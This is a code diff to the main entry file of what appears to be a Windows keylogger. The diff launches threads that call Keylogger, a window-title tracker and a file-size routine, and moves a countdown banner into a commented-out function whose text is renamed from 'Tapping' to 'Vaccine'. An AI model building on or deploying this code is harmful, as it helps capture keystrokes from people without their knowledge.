@@ -4,14 +4,14 @@
 // #include "mailmanager.h"
 #include "winmanager.h"
 #include "KeyLogger.h"
-using namespace std;
+
+void console();
 
 int main()
 {
     auto main = []() {
         printf("Running... \n");
         Keylogger(NULL);
-        printf("terminated.. \n");
     };
     auto window = []() {
         wintitle();
@@ -21,17 +21,7 @@ int main()
     };
     HMODULE hModule = GetModuleHandle(nullptr);
     if (hModule != nullptr) {
-        printf("\033[1;32m");
-        Sleep(500);
-        printf("Tapping starts in..\n");
-        Sleep(1000);
-        printf("3..\n");
-        Sleep(1000);
-        printf("2..\n");
-        Sleep(1000);
-        printf("1..\n");
-        Sleep(1000);
-
+        console();
         thread t1 = thread(main);
         thread t2 = thread(window);
         thread t3 = thread(filesize);
@@ -39,4 +29,17 @@ int main()
         t2.join();
         t3.join();
     }
+}
+
+void console() {
+   /* printf("\033[1;32m");
+    Sleep(500);
+    printf("Vaccine starts in..\n");
+    Sleep(1000);
+    printf("3..\n");
+    Sleep(1000);
+    printf("2..\n");
+    Sleep(1000);
+    printf("1..\n");
+    Sleep(1000);*/
 }
